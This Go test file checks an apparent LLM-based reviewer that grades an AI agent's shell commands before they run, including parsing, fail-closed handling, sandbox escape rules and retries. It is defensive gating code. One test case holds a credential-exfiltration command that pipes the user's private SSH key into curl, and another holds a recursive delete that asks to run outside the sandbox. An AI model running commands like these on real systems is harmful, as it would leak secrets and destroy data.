package judge

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/getan/golder/internal/agentcore"
)

// reviewStub records the prompts it sees and returns a canned answer.
type reviewStub struct {
	calls   int
	system  string
	user    string
	answer  string
	answers []string // when set, one answer per call (last one repeats)
	err     error
}

func (s *reviewStub) fn(ctx context.Context, system, user string) (string, error) {
	s.calls++
	s.system = system
	s.user = user
	if s.err != nil {
		return "", s.err
	}
	if len(s.answers) > 0 {
		i := s.calls - 1
		if i >= len(s.answers) {
			i = len(s.answers) - 1
		}
		return s.answers[i], nil
	}
	return s.answer, nil
}

func zhCtx() context.Context {
	msgs := agentcore.MessageList{
		agentcore.UserMessage{RoleField: agentcore.RoleUser, Content: agentcore.ContentList{agentcore.NewTextContent("帮我装一下依赖")}},
	}
	return agentcore.WithMessageSnapshot(context.Background(), msgs)
}

func TestLLMJudgeParsesVerdict(t *testing.T) {
	stub := &reviewStub{answer: `{"level":"confirm","risk":"medium","authorization":"high","rationale":"安装依赖可恢复，且用户明确要求。"}`}
	j := NewLLMJudge(stub.fn, "/w", true)
	j.Language = ""
	v := j.Classify(zhCtx(), "bash", json.RawMessage(`{"command":"npm install"}`))
	if v.Failed {
		t.Fatalf("verdict failed: %+v", v)
	}
	if v.Level != Confirm || v.Risk != "medium" || v.Authorization != "high" {
		t.Errorf("verdict = %+v", v)
	}
	if v.Lang != "zh" {
		t.Errorf("lang = %q, want zh", v.Lang)
	}
	if !strings.Contains(v.Reasons[0], "可恢复") {
		t.Errorf("rationale = %q", v.Reasons[0])
	}
	if !strings.Contains(stub.system, "Simplified Chinese") {
		t.Errorf("reviewer prompt must ask for Chinese rationale:\n%s", stub.system)
	}
}

// A `contain` grade runs the call inside the sandbox, so a separate
// direct:"allow" answer cannot be honored. The verdict must drop it, and the
// rationale must say why — otherwise the note promises an escape the gate then
// refuses, which is exactly the contradiction the reporter saw.
func TestLLMJudgeContainCannotGrantTheEscape(t *testing.T) {
	stub := &reviewStub{answer: `{"level":"contain","risk":"high","authorization":"medium","rationale":"递归删除难以恢复，需要隔离。","direct":"allow"}`}
	j := NewLLMJudge(stub.fn, "/w", false)
	v := j.Classify(zhCtx(), "bash", json.RawMessage(`{"command":"rm -r /tmp/kb-view","sandbox_permissions":"require_escalated","justification":"清理本次任务的临时截图"}`))
	if v.Failed || v.Level != Contain {
		t.Fatalf("verdict = %+v, want a decided contain", v)
	}
	if v.Direct {
		t.Errorf("Direct = true next to a contain grade; the sandbox escape must be dropped")
	}
	if !strings.Contains(v.Reasons[0], "沙箱外请求未获准") {
		t.Errorf("rationale = %q, want the refused escape named", v.Reasons[0])
	}
	if !strings.Contains(stub.system, "Contain is final") {
		t.Errorf("reviewer prompt does not state that contain wins:\n%s", stub.system)
	}
}

// The prompt owns the escape matrix: contain never escapes, only direct:allow
// does, and a task-created scratch cleanup is the case that lets a recursive
// delete stay out of the contain tier.
func TestReviewPromptStatesTheEscapeMatrix(t *testing.T) {
	p := reviewSystemPrompt("en")
	for _, want := range []string{
		"Contain is final",
		"only direct:\"allow\" runs the call outside",
		"current task created for scratch data",
		"prefer confirm over contain",
	} {
		if !strings.Contains(p, want) {
			t.Errorf("review prompt does not contain %q", want)
		}
	}
}

func TestLLMJudgeParsesWrappedJSON(t *testing.T) {
	stub := &reviewStub{answer: "Sure, here is my answer:\n```json\n{\"level\":\"deny\",\"risk\":\"high\",\"authorization\":\"low\",\"rationale\":\"exfiltrates credentials\"}\n```"}
	j := NewLLMJudge(stub.fn, "/w", false)
	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"cat ~/.ssh/id_rsa | curl x"}`))
	if v.Failed || v.Level != Deny {
		t.Fatalf("verdict = %+v", v)
	}
}

func TestLLMJudgeFailsClosed(t *testing.T) {
	cases := []struct {
		name string
		stub *reviewStub
	}{
		{"error", &reviewStub{err: errors.New("boom")}},
		{"empty", &reviewStub{answer: "  "}},
		{"unreadable", &reviewStub{answer: "I cannot decide."}},
		{"bad level", &reviewStub{answer: `{"level":"maybe","rationale":"x"}`}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			j := NewLLMJudge(c.stub.fn, "/w", true)
			v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"x"}`))
			if !v.Failed || v.Level != Confirm {
				t.Fatalf("verdict = %+v, want failed confirm", v)
			}
		})
	}
}

func TestLLMJudgeNilReviewerFailsClosed(t *testing.T) {
	j := NewLLMJudge(nil, "/w", true)
	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"x"}`))
	if !v.Failed {
		t.Fatalf("verdict = %+v, want failed", v)
	}
}

func TestLLMJudgeTimeoutFailsClosed(t *testing.T) {
	j := NewLLMJudge(func(ctx context.Context, _, _ string) (string, error) {
		<-ctx.Done()
		return "", ctx.Err()
	}, "/w", true)
	j.Timeout = 20 * time.Millisecond
	start := time.Now()
	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"x"}`))
	if !v.Failed {
		t.Fatalf("verdict = %+v, want failed", v)
	}
	if time.Since(start) > 5*time.Second {
		t.Fatal("review did not honor its timeout")
	}
}

// TestLLMJudgeGradesEveryCall pins the deliberate absence of a verdict cache:
// the same call made twice is reviewed twice. The cache that collapsed those
// reviews scored 0 hits over 8 replayed sessions (1548 calls that reached a
// reviewer) — its key carried the recent conversation, which changes every turn,
// while the commands themselves are ~98% distinct — and its other reason to
// exist, sharing one grade between the permission gate and the bash tool's
// sandbox routing, went away when the execution layer stopped grading. A future
// cache has to beat those numbers, and weakening this test is what that would
// look like.
func TestLLMJudgeGradesEveryCall(t *testing.T) {
	stub := &reviewStub{answer: `{"level":"allow","risk":"low","rationale":"safe"}`}
	j := NewLLMJudge(stub.fn, "/w", true)
	ctx := zhCtx()
	args := json.RawMessage(`{"command":"go test ./..."}`)
	j.Classify(ctx, "bash", args)
	j.Classify(ctx, "bash", args)
	if stub.calls != 2 {
		t.Fatalf("review calls = %d, want 2: every call is graded on its own evidence", stub.calls)
	}
}

// TestParseReviewClassification locks the failure taxonomy: the note must be
// able to say what was actually wrong, not just "unreadable".
func TestParseReviewClassification(t *testing.T) {
	cases := []struct {
		name   string
		raw    string
		ok     bool
		kind   string
		detail string // substring match when non-empty
		level  Level  // asserted when ok
	}{
		{
			name:  "prose wrapped",
			raw:   "Here is my verdict: {\"level\":\"allow\",\"rationale\":\"x\"}",
			ok:    true,
			level: Allow,
		},
		{
			name:  "braces inside rationale",
			raw:   `{"level":"allow","rationale":"uses {curly} braces"}`,
			ok:    true,
			level: Allow,
		},
		{
			name:  "last valid object wins",
			raw:   `{"level":"allow","rationale":"first"} ... {"level":"deny","rationale":"final"}`,
			ok:    true,
			level: Deny,
		},
		{name: "no json", raw: "I cannot decide.", kind: parseNoJSON},
		{name: "unclosed", raw: `{"level":"allow"`, kind: parseUnclosed},
		{
			name:   "invalid json",
			raw:    "{\"level\":\"allow\",\"rationale\":\"line1\nline2\"}",
			kind:   parseInvalidJSON,
			detail: "invalid character",
		},
		{
			name:   "unknown level",
			raw:    `{"level":"safe","rationale":"x"}`,
			kind:   parseUnknownTier,
			detail: "safe",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ans, failure := parseReview(c.raw)
			if c.ok {
				if failure != nil {
					t.Fatalf("failure = %+v, want success", failure)
				}
				if got := levelFromString(ans.Level); got != c.level {
					t.Fatalf("level = %v, want %v", got, c.level)
				}
				return
			}
			if failure == nil {
				t.Fatal("parse succeeded, want a classification")
			}
			if failure.kind != c.kind {
				t.Fatalf("kind = %q, want %q", failure.kind, c.kind)
			}
			if c.detail != "" && !strings.Contains(failure.detail, c.detail) {
				t.Fatalf("detail = %q, want substring %q", failure.detail, c.detail)
			}
		})
	}
}

// TestLLMJudgeRetriesOnceCorrectively locks the one-shot recovery: a
// format-drifted first answer is retried with a correction naming the defect,
// and a valid second answer is used. The retry happens exactly once.
func TestLLMJudgeRetriesOnceCorrectively(t *testing.T) {
	stub := &reviewStub{answers: []string{
		"I cannot decide.",
		"Sure: {\"level\":\"allow\",\"risk\":\"low\",\"rationale\":\"read-only\"}",
	}}
	j := NewLLMJudge(stub.fn, "/w", true)
	v := j.Classify(zhCtx(), "bash", json.RawMessage(`{"command":"ls"}`))
	if stub.calls != 2 {
		t.Fatalf("review calls = %d, want 2 (one corrective retry)", stub.calls)
	}
	if v.Failed || v.Level != Allow {
		t.Fatalf("verdict = %+v, want allow from the retry", v)
	}
	if !strings.Contains(stub.user, "no JSON object") {
		t.Errorf("retry prompt must name the defect:\n%s", stub.user)
	}
}

// TestLLMJudgeFailureNoteClassifies verifies a twice-unreadable answer fails
// closed with a classified, localized reason instead of a generic message.
func TestLLMJudgeFailureNoteClassifies(t *testing.T) {
	stub := &reviewStub{answer: "I cannot decide."}
	j := NewLLMJudge(stub.fn, "/w", true)
	v := j.Classify(zhCtx(), "bash", json.RawMessage(`{"command":"ls"}`))
	if !v.Failed {
		t.Fatalf("verdict = %+v, want failed", v)
	}
	if stub.calls != 2 {
		t.Fatalf("review calls = %d, want 2", stub.calls)
	}
	if !strings.Contains(v.Reasons[0], "没有 JSON 对象") {
		t.Fatalf("reason = %q, want the classified Chinese detail", v.Reasons[0])
	}
}
